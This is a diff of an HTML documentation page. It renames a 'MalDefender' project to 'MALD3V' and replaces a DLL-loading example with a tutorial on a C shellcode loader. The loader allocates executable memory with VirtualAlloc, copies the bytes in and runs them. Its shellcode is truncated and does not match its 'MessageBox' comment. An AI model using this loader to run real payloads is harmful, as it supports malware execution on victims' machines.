@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Simple Loader - MalDefender</title>
+    <title>Simple Loader - MALD3V</title>
     <style>
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -22,51 +22,80 @@
             line-height: 1.8;
             color: #4a5568;
         }
-        code {
-            background-color: #edf2f7;
-            padding: 4px 8px;
-            border-radius: 4px;
+        h2 {
             color: #2d3748;
+            margin-top: 20px;
         }
         pre {
-            background-color: #edf2f7;
-            padding: 12px;
-            border-radius: 4px;
+            background-color: #f7f7f7;
+            padding: 10px;
+            border-radius: 8px;
             overflow-x: auto;
+        }
+        code {
+            font-family: 'Courier New', Courier, monospace;
+            font-size: 1em;
+            color: #c7254e;
+            background-color: #f9f2f4;
+            padding: 2px 4px;
+            border-radius: 4px;
         }
     </style>
 </head>
 <body>
-    <h1>Simple Loader for MalDefender</h1>
+    <h1>Simple Loader</h1>
     <p>
-        The Simple Loader component is an essential part of the MalDefender project. It demonstrates the process of dynamically loading a DLL into memory, which is vital for executing various functionalities within the project.
-    </p>
-    <p>
-        Key aspects of the Simple Loader include:
+        A simple shellcode loader is a basic program designed to inject and execute shellcode directly within the process's memory space. This type of loader typically involves the following steps:
     </p>
     <ul>
-        <li>Loading DLLs from specified paths or URLs.</li>
-        <li>Calling functions within the DLL safely.</li>
-        <li>Managing memory efficiently.</li>
+        <li>Allocating memory within the current process or a target process.</li>
+        <li>Copying the shellcode into the allocated memory.</li>
+        <li>Changing the memory protection settings to make the memory executable.</li>
+        <li>Executing the shellcode.</li>
     </ul>
+
+    <h2>Code Example: Simple Loader</h2>
     <p>
-        Below is a code snippet showing the basic implementation of the loader:
+        Below is an example of a simple loader written in C. This loader will allocate memory, copy the shellcode into it, set the appropriate memory protections, and then execute the shellcode. The shellcode used in this example is highly abbreviated for demonstration purposes.
     </p>
+
     <pre><code>
-// Sample code for loading a DLL in C/C++
-#include <windows.h>
+// Simple Loader Example (Abbreviated Shellcode)
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
 
 int main() {
-    HMODULE hModule = LoadLibrary("example.dll");
-    if (hModule != NULL) {
-        // Perform operations with the DLL
-        FreeLibrary(hModule);
+    // Example shellcode (NOP sled + MessageBox)
+    unsigned char shellcode[] = {
+        0x90, 0x90, 0x90, // NOP sled
+        0x48, 0x31, 0xC0, // xor rax, rax
+        // ... [Truncated for brevity]
+        0xC3 // ret
+    };
+
+    // Allocate memory for shellcode
+    LPVOID exec_mem = VirtualAlloc(
+        NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
+    );
+
+    if (exec_mem == NULL) {
+        printf("Memory allocation failed.\n");
+        return -1;
     }
+
+    // Copy shellcode to allocated memory
+    RtlMoveMemory(exec_mem, shellcode, sizeof(shellcode));
+
+    // Execute the shellcode
+    ((void(*)())exec_mem)();
+
     return 0;
 }
     </code></pre>
+
     <p>
-        For the complete implementation and additional details, check out the GitHub repository associated with MalDefender.
+        This simple loader demonstrates the essential steps needed to run shellcode within a process. The shellcode in this example is extremely abbreviated, but in practice, it could perform any number of actions, from displaying a message box to more complex tasks.
     </p>
 </body>
 </html>
+
